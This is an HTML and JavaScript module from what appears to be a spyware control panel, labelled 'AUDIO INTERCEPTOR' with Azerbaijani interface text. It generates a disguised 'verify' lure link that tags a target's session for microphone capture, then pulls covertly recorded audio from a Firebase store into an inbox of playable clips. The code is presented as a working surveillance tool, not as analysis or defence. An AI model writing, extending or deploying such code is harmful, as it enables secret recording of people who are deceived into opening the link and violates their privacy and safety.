<div id="mic-module" style="color: #ff3300; font-family: 'Outfit', sans-serif; padding: 20px; background: #050000; border: 1px solid #330000; border-radius: 15px; text-align: center;">
    <i class="fas fa-microphone-alt" style="font-size: 3rem; color: #ff3300; animation: pulse 1s infinite;"></i>
    <h3 style="font-family: 'Syncopate'; font-size: 0.8rem; margin-top: 15px;">AUDIO INTERCEPTOR</h3>
    
    <div id="mic-init">
        <button onclick="createMicTrap()" style="width: 100%; padding: 18px; background: #ff3300; color: white; border: none; font-weight: 900; border-radius: 12px; cursor: pointer;">SƏS TƏLƏSİ YARAT</button>
    </div>

    <div id="mic-active" style="display: none; margin-top: 20px;">
        <div style="background: #111; padding: 10px; border-radius: 10px; font-size: 0.7rem; color: #ff3300; border: 1px solid #330000;" id="m-link"></div>
        <div id="audio-inbox" style="margin-top: 20px; text-align: left;">
            <h4 style="font-size: 0.65rem; color: #888;">GƏLƏN SƏS YAZILARI:</h4>
            <div id="audio-list" style="height: 120px; overflow-y: auto; background: #000; border-radius: 10px; border: 1px solid #222;"></div>
        </div>
    </div>
</div>

<script>
    function createMicTrap() {
        const uid = localStorage.getItem('elite_session');
        const link = window.location.origin + "/verify.html?spy=mic&ref=" + uid;
        document.getElementById('m-link').innerText = link;
        document.getElementById('mic-init').style.display = 'none';
        document.getElementById('mic-active').style.display = 'block';

        db.ref('audio_logs/' + uid).on('child_added', snap => {
            const data = snap.val();
            document.getElementById('audio-list').innerHTML += `
                <div style="padding: 10px; border-bottom: 1px solid #111;">
                    <small style="color:#555;">${data.time}</small>
                    <audio controls style="width: 100%; height: 25px; margin-top:5px;">
                        <source src="${data.url}" type="audio/webm">
                    </audio>
                </div>`;
        });
    }
</script>
